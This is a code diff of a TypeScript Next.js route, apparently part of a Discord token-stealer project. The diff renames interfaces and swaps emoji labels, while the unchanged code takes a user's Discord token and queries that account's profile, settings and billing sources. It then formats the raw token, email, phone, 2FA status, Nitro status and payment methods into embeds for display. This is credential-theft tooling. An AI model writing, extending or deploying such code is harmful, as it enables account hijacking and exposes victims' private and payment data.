@@ -1,9 +1,9 @@
-import { meta } from '@k4itrun/config';
+import { meta } from '@9ll-fun/config';
 import axios from 'axios';
 import { NextRequest, NextResponse } from "next/server";
 
 
-interface Emojis {
+interface IEmojis {
   themes: Record<string, string>;
   status: Record<string, string>;
   user: {
@@ -12,11 +12,11 @@ interface Emojis {
   };
 }
 
-interface Languages {
+interface ILanguages {
   [key: string]: string;
 }
 
-interface UserProfile {
+interface IUserProfile {
   premium_type: number;
   premium_guild_since?: string;
   id: string;
@@ -28,13 +28,13 @@ interface UserProfile {
   public_flags?: number;
 }
 
-interface BillingSource {
+interface IBillingSource {
   type: number;
   email?: string;
   invalid?: boolean;
 }
 
-interface Embed {
+interface IEmbed {
   color: number;
   title: string;
   thumbnail: { url: string };
@@ -95,7 +95,7 @@ export async function GET(request: NextRequest) {
   }
 }
 
-const emojis: Emojis = {
+const emojis: IEmojis = {
   themes: {
     dark: "Dark",
     light: "Light",
@@ -134,7 +134,7 @@ const emojis: Emojis = {
   },
 };
 
-const languages: Languages = {
+const languages: ILanguages = {
   "zh-TW": "🇨🇳 Chinese-Taiwanese",
   "pr-BR": "🇵🇹 Portuguese",
   "sv-SE": "🇸🇪 Swedish",
@@ -183,7 +183,7 @@ async function _fetch(url: string, token: string): Promise<any> {
   }
 }
 
-function nitro(user: UserProfile): string {
+function nitro(user: IUserProfile): string {
   const { premium_type, premium_guild_since } = user;
   const nitro = '<:nitro:1297275179566895184>';
 
@@ -211,7 +211,7 @@ function nitro(user: UserProfile): string {
   }
 }
 
-function billing(payment: BillingSource[]): string {
+function billing(payment: IBillingSource[]): string {
   const types: Record<number, string> = {
     1: '<:creditcart:741512388490035251>',
     3: '`Giropay`',
@@ -260,7 +260,7 @@ function flags(badge: number | undefined): string {
   ) || '`❓`';
 }
 
-async function embeds(user: UserProfile & { token: string }): Promise<Embed[]> {
+async function embeds(user: IUserProfile & { token: string }): Promise<IEmbed[]> {
   const profile = await _fetch(`https://discord.com/api/v9/users/${user.id}/profile`, user.token);
   const settings = await _fetch(`https://discord.com/api/v9/users/@me/settings`, user.token);
   const payment = await _fetch(`https://discord.com/api/v9/users/@me/billing/payment-sources`, user.token);
@@ -279,35 +279,35 @@ async function embeds(user: UserProfile & { token: string }): Promise<Embed[]> {
       },
       fields: [
         {
-          name: `<:x:1194495538138185728> Token:`,
+          name: `🔑 Token:`,
           value: '```' + user.token + '```',
           inline: false
         },
         { name: '\u200b', value: '\u200b', inline: false },
         {
-          name: '<a:mail:1245038428891123815> Email:',
+          name: '✉ Email:',
           value: '`' + (user.email || '❓') + '`',
           inline: true
         },
         {
-          name: '<a:phone:1104204812867874936> Phone:',
+          name: '📱 Phone:',
           value: '`' + (user.phone || '❓') + (user.mfa_enabled ? ' (2FA)' : '') + '`',
           inline: true
         },
         { name: '\u200b', value: '\u200b', inline: false },
         {
-          name: '<a:nitro:1122755911967068210> Nitro:',
+          name: '✨ Nitro:',
           value: nitro(profile),
           inline: true
         },
         {
-          name: '<:billing:1122678162288037929> Billing:',
+          name: '💳 Billing:',
           value: billing(payment),
           inline: true
         },
         { name: '\u200b', value: '\u200b', inline: false },
         {
-          name: '<a:badges:1138323945284714516> Badges:',
+          name: '🎭 Badges:',
           value: flags(user.public_flags),
           inline: true
         },
